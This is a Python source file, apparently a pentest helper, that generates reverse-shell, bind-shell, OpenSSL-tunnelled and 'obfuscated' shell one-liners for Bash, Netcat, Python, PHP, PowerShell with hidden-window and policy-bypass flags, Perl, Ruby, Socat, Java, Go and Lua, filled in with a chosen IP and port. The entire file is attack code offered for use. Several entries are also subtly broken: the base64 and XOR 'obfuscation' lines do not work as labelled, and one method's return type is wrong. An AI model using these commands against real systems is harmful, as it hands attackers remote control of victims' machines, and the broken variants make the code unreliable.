from typing import Dict

class ReverseShellGenerator:
    @staticmethod
    def get_reverse_shells(ip: str = "10.10.10.10", port: str = "4444") -> Dict[str, str]:
        """Return dictionary with reverse shell one-liners"""
        return {
            "Bash TCP": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "Bash UDP": f"bash -i >& /dev/udp/{ip}/{port} 0>&1",
            "Netcat (traditional)": f"nc -e /bin/bash {ip} {port}",
            "Netcat (no -e)": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            "Python": (
                f"python3 -c 'import socket,subprocess,os;"
                f"s=socket.socket();s.connect((\"{ip}\",{port}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'"
            ),
            "PHP": (
                f"php -r '$sock=fsockopen(\"{ip}\",{port});"
                f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            ),
            "PowerShell": (
                f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \""
                f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
                f"$stream = $client.GetStream();"
                f"[byte[]]$bytes = 0..65535|%{{0}};"
                f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
                f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
                f"$sendback = (iex $data 2>&1 | Out-String );"
                f"$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";"
                f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}\""
            ),
            "Perl": (
                f"perl -e 'use Socket;$i=\"{ip}\";$p={port};"
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
                f"open(STDIN,\">&S\");open(STDOUT,\">&S\");"
                f"open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
            ),
            "Ruby": (
                f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
                f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
            ),
            "Socat": f"socat TCP:{ip}:{port} EXEC:/bin/sh",
            "Java": (
                f"r = Runtime.getRuntime()\n"
                f"p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};"
                f"cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[])\n"
                f"p.waitFor()"
            ),
            "Golang": (
                f"echo 'package main;import\"os/exec\";import\"net\";"
                f"func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");"
                f"cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;"
                f"cmd.Stderr=c;cmd.Run()}}' > /tmp/shell.go && "
                f"go run /tmp/shell.go"
            ),
            "Lua": (
                f"lua -e \"require('socket');require('os');"
                f"t=socket.tcp();t:connect('{ip}','{port}');"
                f"os.execute('/bin/sh -i <&3 >&3 2>&3');\""
            )
        }

    @staticmethod
    def get_bind_shells(ip: str = "0.0.0.0", port: str = "4444") -> Dict[str, str]:
        """Return dictionary with bind shell one-liners"""
        return {
            "Bash Bind": f"nc -lvp {port} -e /bin/bash",
            "Python Bind": (
                f"python3 -c 'import socket,subprocess,os;"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                f"s.bind((\"{ip}\",{port}));s.listen(1);"
                f"conn,addr=s.accept();"
                f"os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);"
                f"os.dup2(conn.fileno(),2);subprocess.call([\"/bin/sh\"])'"
            ),
            "Socat Bind": f"socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/bash",
            "Netcat Bind": f"nc -lvp {port} -e /bin/bash",
            "PowerShell Bind": (
                f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \""
                f"$listener = New-Object System.Net.Sockets.TcpListener('{ip}',{port});"
                f"$listener.Start();"
                f"$client = $listener.AcceptTcpClient();"
                f"$stream = $client.GetStream();"
                f"[byte[]]$bytes = 0..65535|%{{0}};"
                f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
                f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
                f"$sendback = (iex $data 2>&1 | Out-String );"
                f"$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";"
                f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
                f"$listener.Stop()\""
            )
        }

    @staticmethod
    def generate_ssl_shell(ip: str, port: str) -> str:
        """Generate SSL encrypted shell commands"""
        return {
            "OpenSSL Reverse": (
                f"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | "
                f"openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s"
            ),
            "OpenSSL Bind": (
                f"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes; "
                f"openssl s_server -quiet -key key.pem -cert cert.pem -port {port}"
            )
        }

    @staticmethod
    def generate_obfuscated_shell(ip: str, port: str) -> Dict[str, str]:
        """Generate obfuscated shell commands"""
        return {
            "Base64 Encoded Bash": (
                f"bash -i >& /dev/tcp/{ip}/{port} 0>&1 | "
                f"base64 -w0 | bash -i >& /dev/tcp/{ip}/{port} 0>&1"
            ),
            "XOR Encoded Python": (
                f"python3 -c 'import socket,subprocess,os,base64;"
                f"xor=lambda x,y:bytes(a^b for a,b in zip(x,y));"
                f"key=b\"secret\";"
                f"s=socket.socket();s.connect((\"{ip}\",{port}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                f"os.dup2(s.fileno(),2);"
                f"p=subprocess.Popen([\"/bin/sh\"],stdin=subprocess.PIPE,"
                f"stdout=subprocess.PIPE,stderr=subprocess.PIPE);"
                f"while True:"
                f"  cmd=s.recv(1024);"
                f"  if not cmd:break;"
                f"  cmd=xor(cmd,key*(len(cmd)//len(key)+1));"
                f"  p.stdin.write(cmd);p.stdin.flush();"
                f"  out=xor(p.stdout.read(),key*(len(out)//len(key)+1));"
                f"  s.sendall(out)'"
            )
        }
